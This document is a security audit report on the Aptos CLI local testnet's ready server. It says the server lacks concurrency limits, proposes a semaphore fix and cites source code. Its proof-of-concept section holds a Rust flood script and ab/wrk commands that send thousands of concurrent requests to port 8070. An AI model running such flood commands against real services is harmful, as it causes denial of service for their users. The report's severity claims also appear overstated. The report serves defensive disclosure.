# Audit Report

## Title
Unbounded Concurrent Request Handling in Local Testnet Ready Server Enables Tokio Runtime Exhaustion DoS

## Summary
The local testnet ready server exposes an HTTP endpoint without any concurrency limits, allowing an attacker to exhaust the shared tokio runtime by flooding it with concurrent requests. Each request spawns a task that performs multiple health checks with 3-second timeouts, and since all localnet services (validator node, faucet, processors, indexer) share the same tokio runtime, this causes a denial-of-service affecting the entire localnet.

## Finding Description

The vulnerability exists in the ready server's request handling logic. The `root()` handler function processes incoming HTTP requests by iterating through all configured health checkers and performing health checks with 3-second timeouts. [1](#0-0) 

The ready server runs as a Poem web server that spawns a task for each incoming HTTP request. [2](#0-1) 

Critically, there is **no concurrency limiting** implemented in the ready server - no semaphore, rate limiting, or maximum concurrent connection limits.

The attack vector works as follows:

1. The Aptos CLI creates a single tokio runtime with default configuration for all localnet services. [3](#0-2) 

2. All localnet service managers (node, faucet, processors, indexer API, ready server) are spawned as tasks on this shared runtime using `JoinSet`. [4](#0-3) 

3. An attacker can send unlimited concurrent HTTP GET requests to the ready server endpoint (default: `http://127.0.0.1:8070/` or `http://0.0.0.0:8070/` in containers).

4. The Poem server spawns a separate task for each incoming request, with no upper bound.

5. Each task executes health checks against multiple services (node API, faucet, postgres, processors, data service gRPC). [5](#0-4) 

6. With thousands of concurrent requests, the tokio runtime becomes overloaded managing all these tasks, causing:
   - Excessive memory consumption (each task allocates stack frames and state)
   - Scheduler contention (tokio must poll thousands of futures)
   - Connection pool exhaustion (to external services)
   - Degraded performance of all services sharing the runtime

This breaks the **Resource Limits** invariant (#9): "All operations must respect gas, storage, and computational limits."

**In contrast**, the faucet service properly implements concurrency limiting using a semaphore that rejects requests when overloaded. [6](#0-5) 

The faucet's `preprocess_request()` function uses `try_acquire()` to immediately reject excess concurrent requests with a "Server overloaded" error. [7](#0-6) 

## Impact Explanation

This is a **High Severity** vulnerability per the Aptos bug bounty criteria, specifically qualifying under:
- **Validator node slowdowns**: The shared tokio runtime degradation affects the validator node's ability to participate in consensus
- **API crashes**: The ready server and other HTTP services can become unresponsive

The impact includes:
- Denial of service on the entire localnet, preventing developers from testing applications
- Validator node performance degradation affecting consensus participation in the local testnet
- Faucet service disruption preventing account funding
- Indexer and processor slowdowns affecting transaction history queries
- Potential crash of the entire localnet if memory exhaustion occurs

While this affects the localnet (not production mainnet), it's a critical tool for developers and testing. The vulnerability demonstrates a dangerous pattern that could affect other Poem-based services if replicated.

## Likelihood Explanation

**Likelihood: High**

The vulnerability is highly likely to be exploited because:

1. **Low Attack Complexity**: Attacker only needs to send HTTP GET requests - no authentication, special privileges, or complex setup required
2. **Publicly Accessible**: The ready server binds to `0.0.0.0` when running in containers, making it network-accessible
3. **No Rate Limiting**: Zero defensive mechanisms in place
4. **Common Attack Pattern**: HTTP flood attacks are well-known and trivial to execute with tools like `ab`, `wrk`, or `siege`
5. **Shared Runtime**: The architectural decision to run all services on a single runtime amplifies the impact

An attacker can exploit this with a simple command:
```bash
# Send 10,000 concurrent requests
ab -n 10000 -c 1000 http://127.0.0.1:8070/
```

## Recommendation

Implement semaphore-based concurrency limiting in the ready server, following the pattern used by the faucet service:

1. **Add a semaphore to `ReadyServerManager`**:
   - Add `concurrent_requests_semaphore: Option<Arc<Semaphore>>` field
   - Initialize it in the constructor with a reasonable limit (e.g., 50-100 concurrent requests)

2. **Implement request limiting in the handler**:
   - Modify the `root()` function to acquire the semaphore at the start
   - Use `try_acquire()` to fail fast when overloaded
   - Return `503 Service Unavailable` when the limit is exceeded
   - Hold the permit for the entire request duration

3. **Add configuration option**:
   - Add a CLI argument `--ready-server-max-concurrent-requests` to allow customization
   - Document the default value and its rationale

Example implementation pattern (based on faucet service):

```rust
pub struct ReadyServerManager {
    config: ReadyServerArgs,
    bind_to: Ipv4Addr,
    health_checkers: HashSet<HealthChecker>,
    concurrent_requests_semaphore: Option<Arc<Semaphore>>, // ADD THIS
}

#[handler]
async fn root(
    health_checkers: Data<&HealthCheckers>,
    semaphore: Data<&Option<Arc<Semaphore>>>, // ADD THIS
) -> impl IntoResponse + use<> {
    // ADD CONCURRENCY LIMITING
    let _permit = match semaphore.0 {
        Some(sem) => match sem.try_acquire() {
            Ok(permit) => Some(permit),
            Err(_) => {
                return Json(serde_json::json!({
                    "error": "Server overloaded, please try again later"
                }))
                .with_status(StatusCode::SERVICE_UNAVAILABLE);
            }
        },
        None => None,
    };
    
    // Existing health check logic...
}
```

## Proof of Concept

**Test Setup:**
```bash
# Start the localnet
aptos node run-local-testnet
```

**Attack Script (Rust):**
```rust
use tokio;
use reqwest;

#[tokio::main]
async fn main() -> Result<(), Box<dyn std::error::Error>> {
    let url = "http://127.0.0.1:8070/";
    let mut tasks = vec![];
    
    // Spawn 5000 concurrent requests
    for i in 0..5000 {
        let url = url.to_string();
        tasks.push(tokio::spawn(async move {
            let start = std::time::Instant::now();
            let result = reqwest::get(&url).await;
            let duration = start.elapsed();
            println!("Request {}: {:?} took {:?}", i, result.is_ok(), duration);
        }));
    }
    
    // Wait for all requests to complete
    for task in tasks {
        let _ = task.await;
    }
    
    Ok(())
}
```

**Alternative using standard tools:**
```bash
# Apache Bench - send 10,000 requests with 1,000 concurrent
ab -n 10000 -c 1000 http://127.0.0.1:8070/

# wrk - sustained load for 30 seconds with 500 connections
wrk -t12 -c500 -d30s http://127.0.0.1:8070/
```

**Expected Result:**
- Response times increase dramatically (from milliseconds to seconds)
- Other localnet services (node API at port 8080, faucet at port 8081) become slow or unresponsive
- High CPU usage from tokio scheduler overhead
- Memory consumption increases significantly
- Potential localnet crash under sustained load

**Verification:**
Monitor system resources and other service response times while running the attack. The validator node's consensus participation and block production will be impacted, demonstrating the cross-service effect of the shared runtime exhaustion.

---

## Notes

This vulnerability is specific to the local testnet tool and does not directly affect production Aptos networks. However, it represents a serious issue for developer experience and testing infrastructure. The pattern of missing concurrency controls should be audited across all Poem-based HTTP services in the codebase to ensure production services implement proper rate limiting and resource management.

### Citations

**File:** crates/aptos/src/node/local_testnet/ready_server.rs (L80-97)
```rust
pub async fn run_ready_server(
    health_checkers: HashSet<HealthChecker>,
    config: ReadyServerArgs,
    bind_to: Ipv4Addr,
) -> Result<()> {
    let app = Route::new()
        .at("/", get(root))
        .data(HealthCheckers { health_checkers })
        .with(Tracing);
    Server::new(TcpListener::bind(SocketAddrV4::new(
        bind_to,
        config.ready_server_listen_port,
    )))
    .name("ready-server")
    .run(app)
    .await?;
    Err(anyhow::anyhow!("Ready server exited unexpectedly"))
}
```

**File:** crates/aptos/src/node/local_testnet/ready_server.rs (L110-131)
```rust
#[handler]
async fn root(health_checkers: Data<&HealthCheckers>) -> impl IntoResponse + use<> {
    let mut ready = vec![];
    let mut not_ready = vec![];
    for health_checker in &health_checkers.health_checkers {
        // Use timeout since some of these checks can take quite a while if the
        // underlying service is not ready. This is best effort of course, see the docs
        // for tokio::time::timeout for more information.
        match timeout(Duration::from_secs(3), health_checker.check()).await {
            Ok(Ok(())) => ready.push(health_checker.clone()),
            _ => {
                not_ready.push(health_checker.clone());
            },
        }
    }
    let status_code = if not_ready.is_empty() {
        StatusCode::OK
    } else {
        StatusCode::SERVICE_UNAVAILABLE
    };
    Json(ReadyData { ready, not_ready }).with_status(status_code)
}
```

**File:** crates/aptos/src/main.rs (L20-24)
```rust
    // Create a runtime.
    let runtime = tokio::runtime::Builder::new_multi_thread()
        .enable_all()
        .build()
        .unwrap();
```

**File:** crates/aptos/src/node/local_testnet/mod.rs (L391-396)
```rust
        let mut join_set = JoinSet::new();

        // Start each of the services.
        for manager in managers.into_iter() {
            join_set.spawn(manager.run());
        }
```

**File:** crates/aptos/src/node/local_testnet/health_checker.rs (L44-132)
```rust
impl HealthChecker {
    pub async fn check(&self) -> Result<()> {
        match self {
            HealthChecker::Http(url, _) => {
                reqwest::get(Url::clone(url))
                    .await
                    .with_context(|| format!("Failed to GET {}", url))?;
                Ok(())
            },
            HealthChecker::NodeApi(url) => {
                aptos_rest_client::Client::new(Url::clone(url))
                    .get_index()
                    .await?;
                Ok(())
            },
            HealthChecker::DataServiceGrpc(url) => {
                let backoff = backoff::ExponentialBackoff {
                    max_elapsed_time: Some(Duration::from_secs(5)),
                    ..Default::default()
                };
                backoff::future::retry(backoff, || async {
                    let transaction_stream_config = TransactionStreamConfig {
                        indexer_grpc_data_service_address: url.clone(),
                        auth_token: "notused".to_string(),
                        starting_version: Some(0),
                        request_ending_version: None,
                        request_name_header: "notused".to_string(),
                        additional_headers: Default::default(),
                        indexer_grpc_http2_ping_interval_secs: Default::default(),
                        indexer_grpc_http2_ping_timeout_secs: 60,
                        indexer_grpc_response_item_timeout_secs: 60,
                        indexer_grpc_reconnection_timeout_secs: 60,
                        indexer_grpc_reconnection_max_retries: Default::default(),
                        transaction_filter: None,
                    };
                    get_chain_id(transaction_stream_config)
                        .await
                        .context("Failed to get chain id")?;
                    Ok(())
                })
                .await
                .context("Failed to get a response from gRPC")?;
                Ok(())
            },
            HealthChecker::Postgres(connection_string) => {
                AsyncPgConnection::establish(connection_string)
                    .await
                    .context("Failed to connect to postgres to check DB liveness")?;
                Ok(())
            },
            HealthChecker::Processor(connection_string, processor_name) => {
                let mut connection = AsyncPgConnection::establish(connection_string)
                    .await
                    .context("Failed to connect to postgres to check processor status")?;
                let result = processor_status::table
                    .select((processor_status::last_success_version,))
                    .filter(processor_status::processor.eq(processor_name))
                    .first::<(i64,)>(&mut connection)
                    .await
                    .optional()
                    .context("Failed to look up processor status")?;
                match result {
                    Some(result) => {
                        // This is last_success_version.
                        if result.0 > 0 {
                            info!(
                                "Processor {} started processing successfully (currently at version {})",
                                processor_name, result.0
                            );
                            Ok(())
                        } else {
                            Err(anyhow!(
                                "Processor {} found in DB but last_success_version is zero",
                                processor_name
                            ))
                        }
                    },
                    None => Err(anyhow!(
                        "Processor {} has not processed any transactions",
                        processor_name
                    )),
                }
            },
            HealthChecker::IndexerApiMetadata(url) => {
                confirm_metadata_applied(url.clone()).await?;
                Ok(())
            },
        }
    }
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L184-186)
```rust
    /// This semaphore is used to ensure we only process a certain number of
    /// requests concurrently.
    pub concurrent_requests_semaphore: Option<Arc<Semaphore>>,
```

**File:** crates/aptos-faucet/core/src/endpoints/fund.rs (L204-215)
```rust
        let permit = match &self.concurrent_requests_semaphore {
            Some(semaphore) => match semaphore.try_acquire() {
                Ok(permit) => Some(permit),
                Err(_) => {
                    return Err(AptosTapError::new(
                        "Server overloaded, please try again later".to_string(),
                        AptosTapErrorCode::ServerOverloaded,
                    ))
                },
            },
            None => None,
        };
```
